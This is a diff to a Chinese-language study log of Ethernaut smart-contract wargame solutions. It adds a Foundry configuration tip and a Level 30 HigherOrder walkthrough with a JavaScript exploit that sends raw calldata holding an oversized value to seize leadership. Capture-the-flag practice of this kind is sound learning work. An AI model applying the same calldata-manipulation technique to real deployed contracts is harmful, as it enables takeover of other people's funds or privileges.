@@ -517,11 +517,37 @@ stakeWETH， 有一个WETH.call 把msg.sender 的WETH转到合约中。那么如
 
 还有一个要求就是，UserStake数量是0，这个简单就是村里面又unstake就好了，可以使用两个账户，这样保证 totalStaked 大于 0。
 
+执行的时候报错，google查到说需要 foundry 设置 evm_version = 'shanghai'
 
 [POC代码](Writeup/SpeedX/script/Ethernaut/stake_poc.s.sol)
 
 ### 2024.09.19
 
+**Level30 HigherOrder**
+选个短的合约来做
+
+sstore 第一个参数是xxx_slot 这样改更改对应的变量，现在的 solc编译器这样写 xxx.slot 
+
+calldataload(4) 是从第四个字节开始 加载长度为32字节的calldata数据， calldata前4个字节为 函数选择器 
+
+calldata = '0x211c85ab' + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+```
+const calldata = '0x'
+  + '211c85ab' // 4-byte function selector for registerTreasury(uint8)
+  + 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Could be any value over 255
+
+await ethereum.request({
+  method: 'eth_sendTransaction',
+  params: [{
+    from: (await ethereum.request({ method: 'eth_requestAccounts' }))[0],
+    to: instance,
+    data: calldata
+  }]
+});
+
+await contract.claimLeadership();
+```
 
 
 ### 2024.09.20
